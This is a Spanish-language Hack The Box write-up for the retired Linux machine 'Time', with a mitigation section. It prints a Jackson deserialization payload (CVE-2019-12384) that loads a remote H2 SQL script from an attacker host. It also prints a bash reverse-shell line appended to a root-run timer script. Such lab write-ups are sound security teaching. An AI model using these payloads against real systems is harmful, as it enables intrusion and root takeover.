---
machine: Time
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, jackson, deserialization, cron, privesc]
---

# Time — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web valida JSON con Jackson y devuelve el error de clase, lo que revela CVE-2019-12384. Un payload con el driver H2 ejecuta un script SQL al deserializar y da shell como `pericles`. Un timer de systemd ejecuta `/usr/bin/timer_backup.sh`, escribible por `pericles`, cada pocos segundos; añadir una reverse shell da root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` una herramienta de validación y embellecimiento de JSON.
- La web devuelve excepciones Java completas.
- El error menciona `com.fasterxml.jackson.databind`.

## Enumeración

- Jackson permite `$type` y el backend no lo bloquea.
- La versión es vulnerable a CVE-2019-12384 mediante el driver H2.
- `pericles` tiene un directorio escribible y un timer de systemd.

## Foothold

Se aloja un script SQL que ejecuta una reverse shell y se envía un JSON con `$type` hacia `com.sun.rowset.JdbcRowSetImpl` y una URL JDBC de H2 con `INIT=RUNSCRIPT`.

```json
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<ATTACKER>/poc.sql'","autoCommit":true}]
```

## Movimiento lateral

La shell es `pericles`. La enumeración local muestra `timer_backup.timer` y `timer_backup.service`, que ejecutan `/usr/bin/timer_backup.sh` como root.

```bash
systemctl list-timers
cat /etc/systemd/system/timer_backup.service
ls -l /usr/bin/timer_backup.sh
```

## Escalada de privilegios

El script es world-writable. Se añade una reverse shell y el timer la ejecuta en menos de cinco segundos; el proceso resultante es root.

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1' >> /usr/bin/timer_backup.sh
```

## Evidencia

- Error de Jackson y CVE-2019-12384.
- JSON con `JdbcRowSetImpl` y script H2.
- Shell como `pericles`.
- `timer_backup.sh` modificado y root.

## Lecciones aprendidas

- Un mensaje de error detallado identifica la librería y la versión.
- La deserialización polimórfica de Jackson puede cargar clases peligrosas.
- Un script de backup escribible ejecutado por un timer es root inmediato.

## Mitigación y detección

- Deshabilitar `enableDefaultTyping` y usar DTOs.
- No devolver excepciones internas al usuario.
- Permisos de solo lectura y ruta absoluta en scripts de systemd.

## Referencias

- [0xdf — Time](https://0xdf.gitlab.io/2021/04/03/htb-time.html)
- [IppSec — Time](https://www.youtube.com/watch?v=JfonPpbX-oI)
- [Hack The Box — Time](https://app.hackthebox.com/machines/time)
